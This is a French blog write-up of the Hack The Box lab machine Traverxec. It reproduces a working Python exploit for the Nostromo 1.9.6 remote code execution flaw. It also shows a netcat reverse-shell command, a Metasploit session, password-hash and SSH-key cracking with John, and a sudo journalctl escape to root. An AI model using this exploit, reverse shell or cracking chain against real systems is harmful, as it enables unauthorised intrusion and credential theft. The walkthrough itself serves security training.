---
layout: post
title: HTB - Traverxec
subtitle: Hack The Box - Linux Machine - Medium 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Linux, Nostromo, htpasswd, John, ssh2john, journalctl]
comments: false
---

## User

~~~
root@Host-001:~# nmap -sV 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-16 10:13 CET
Nmap scan report for 10.10.10.165
Host is up (0.015s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.26 seconds
~~~

nostromo est un type de serveur web. Exploit disponible sur Metasploit. Source: [https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html)

Script en python disponible: [https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py](https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py)

~~~
#!/usr/bin/env python

import socket
import argparse

parser = argparse.ArgumentParser(description='RCE in Nostromo web server through 1.9.6 due to path traversal.')
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
parser.add_argument('cmd',help='command to execute, default is id',default='id',nargs='?')
args = parser.parse_args()

def recv(s):
	r=''
	try:
		while True:
			t=s.recv(1024)
			if len(t)==0:
				break
			r+=t
	except:
		pass
	return r
def exploit(host,port,cmd):
	s=socket.socket()
	s.settimeout(1)
	s.connect((host,int(port)))
	payload="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1""".format(cmd)
	s.send(payload)
	r=recv(s)
	r=r[r.index('\r\n\r\n')+4:]
	print r

exploit(args.host,args.port,args.cmd)
~~~

Utilisation du script:

Ouvrir un port d'écoute avec netcat:

~~~
root@Host-001:~# nc -l -v -p 1337
listening on [any] 1337 ...
~~~

Lancer le script: 

~~~
root@Host-001:~/Bureau# python exploit.py 10.10.10.165 80 'nc -e /bin/sh 10.10.14.252 1337'
~~~

On a un shell dans netcat:

~~~
root@Host-001:~# nc -l -v -p 1337
listening on [any] 1337 ...
10.10.10.165: inverse host lookup failed: Unknown host
connect to [10.10.14.252] from (UNKNOWN) [10.10.10.165] 47604
(...)

Le fichier de configuration du serveur est /var/nostromo/conf/nhttpd.conf Ref: [http://www.nazgul.ch/dev/nostromo_man.html](http://www.nazgul.ch/dev/nostromo_man.html)

ls
backups
cache
lib
local
lock
log
mail
nostromo
opt
run
spool
tmp
cd nostromo
ls
conf
htdocs
icons
logs
cd conf
ls
mimes
nhttpd.conf
cat nhhtpd.conf
ls
mimes
nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www

Les mots de passe sont dans: /var/nostromo/conf/.htpasswd

ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .
drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..
-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf
cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
~~~

Avec Metasploit:

~~~
root@Host-001:~/Bureau# msfconsole
[-] ***rting the Metasploit Framework console...\
[-] * WARNING: No database support: could not connect to server: Connection refused
	Is the server running on host "localhost" (::1) and accepting
	TCP/IP connections on port 5432?
could not connect to server: Connection refused
	Is the server running on host "localhost" (127.0.0.1) and accepting
	TCP/IP connections on port 5432?

[-] ***
[-] WARNING! The following modules could not be loaded!
[-] 	/usr/share/metasploit-framework/modules/payloads/stages/windows/encrypted_shell.rb
[-] Please see /root/.msf4/logs/framework.log for details.
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v5.0.64-dev                          ]
+ -- --=[ 1952 exploits - 1092 auxiliary - 335 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


msf5 > use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(multi/http/nostromo_code_exec) > set RHOST 10.10.10.165
RHOST => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set SRVHOST 10.10.14.252
SRVHOST => 10.10.14.252
msf5 exploit(multi/http/nostromo_code_exec) > set SRVPORT 1337
SRVPORT => 1337
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.14.252
LHOST => 10.10.14.252
msf5 exploit(multi/http/nostromo_code_exec) > set LPORT 1337
LPORT => 1337
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.252:1337 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (10.10.14.252:1337 -> 10.10.10.165:47656) at 2019-12-16 12:11:07 +0100
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/usr/bin
cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
~~~

Cracker le mot de passe:

~~~
root@Host-001:~/Bureau# touch hash
root@Host-001:~/Bureau# vim hash
root@Host-001:~/Bureau# cat hash
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
root@Host-001:~/Bureau# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:00:39 DONE (2019-12-16 12:24) 0.02545g/s 269239p/s 269239c/s 269239C/s NuiMeanPoon..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

Pas passible de se loguer avec ce mot de passe via ssh permission denied

Dans le fichier de configuration on voit:

~~~
homedirs		/home
homedirs_public		public_www
~~~

Dans /home il y a un dossier david/. Essayons /home/david/public_www
Il y a un dossier protected-file-area...

~~~
root@Host-001:/# nc -l -v -p 1337
listening on [any] 1337 ...
10.10.10.165: inverse host lookup failed: Unknown host
connect to [10.10.14.252] from (UNKNOWN) [10.10.10.165] 60704
cd /home/david/public_www/protected-file-area
ls
backup-ssh-identity-files.tgz
base64 backup-ssh-identity-files.tgz
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
~~~

Copier le fichier .tgz sur le bureau en base64

~~~
root@Host-001:~/Bureau# echo "H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
gKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4
mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE
/w3+4vq/NP88jNEH84JFzSPi4D1BhC+3PGMz7JfHjM2N/jAadgJdSVjy/NeVew4UGQkXbu02dzPh
6hzE7jwt5h64paBUQcd5I85rZXhHBnNuFCo8CTsocnTcPbm7OkUttG1KrEJIcpKJHkYjRhzchYAl
5rjjTeZjeoUIYKeUKaqyYuAo9kqTHEEYZ/Tq9ZuWNNLALUFTqotmrGRzcRQw8V1LZoRmvUIn84Yc
rKakVOI4+iaJu4HRXcWH1sh4hfTIU5ZHKWjxIjo1BhV0YXTh3TCUWr5IerpwJh5mCVNtdTlybjJ2
r53ZXvRbVaPNjecjp1oJY3s6k15TJWQY5Em5s0HyGrHE9tFJuIG3BiQuZbTa2WSSsJaEWHX1NhN9
noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkL
rCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+
wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVW
p6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62a
VDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpf
efEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNv
GBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gS
Ttb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6
ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCP
qz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3
xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9
M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465
QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaip
FsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY
e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==" | base64 -d > ssh.tgz
~~~

Dézipper le fichier

~~~
root@Host-001:~/Bureau# gunzip -c ssh.tgz | tar xvf -
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
root@Host-001:~/Bureau# cd home
root@Host-001:~/Bureau/home# ls
david
root@Host-001:~/Bureau/home# cd david/
root@Host-001:~/Bureau/home/david# ls
root@Host-001:~/Bureau/home/david# ls -la
total 12
drwxr-xr-x 3 root root 4096 déc.  16 13:17 .
drwxr-xr-x 3 root root 4096 déc.  16 13:17 ..
drwx------ 2 1000 1000 4096 oct.  25 23:02 .ssh
root@Host-001:~/Bureau/home/david# cd .ssh
root@Host-001:~/Bureau/home/david/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@Host-001:~/Bureau/home/david/.ssh# 
~~~

crackons la clé avec John:

~~~
root@Host-001:~/Bureau/home/david/.ssh# python ~/Bureau/JohnTheRipper/run/ssh2john.py id_rsa > keyDavid
root@Host-001:~/Bureau/home/david/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub  keyDavid
root@Host-001:~/Bureau/home/david/.ssh# john keyDavid --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:06 DONE (2019-12-16 13:31) 0.1552g/s 2226Kp/s 2226Kc/s 2226KC/sa6_123..*7¡Vamos!
Session completed
root@Host-001:~/Bureau/home/david/.ssh# 
~~~

Tentons de nous connecter via ssh avec hunter

~~~
root@Host-001:~/Bureau/home/david/.ssh# ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ pwd
/home/david
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
david@traverxec:~$ 
~~~

## Root

~~~
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
~~~

On voit qu'il y a un appel a journalctl. Il est possible d'avoir un shell en utilisant !/bin/bash Réf: [https://gtfobins.github.io/gtfobins/journalctl/](https://gtfobins.github.io/gtfobins/journalctl/) 

~~~
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Mon 2019-12-16 07:49:55 EST, end at Mon 2019-12-16 07:50:52 E
Dec 16 07:50:00 traverxec systemd[1]: Starting nostromo nhttpd server...
Dec 16 07:50:00 traverxec systemd[1]: nostromo.service: Can't open PID file /v
Dec 16 07:50:00 traverxec nhttpd[451]: started
Dec 16 07:50:00 traverxec nhttpd[451]: max. file descriptors = 1040 (cur) / 10
Dec 16 07:50:00 traverxec systemd[1]: Started nostromo nhttpd server.
!/bin/bash
root@traverxec:/home/david/bin# cd /root
root@traverxec:~# ls
nostromo_1.9.6-1.deb  root.txt
root@traverxec:~# cat root.txt
9aa36a6d76f785dfd320a478f6e0d906
root@traverxec:~# 
~~~

**Poursuivez avec :** 

[- Oneliner Shells](https://0xss0rz.github.io/2020-05-10-Oneliner-shells/)
[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
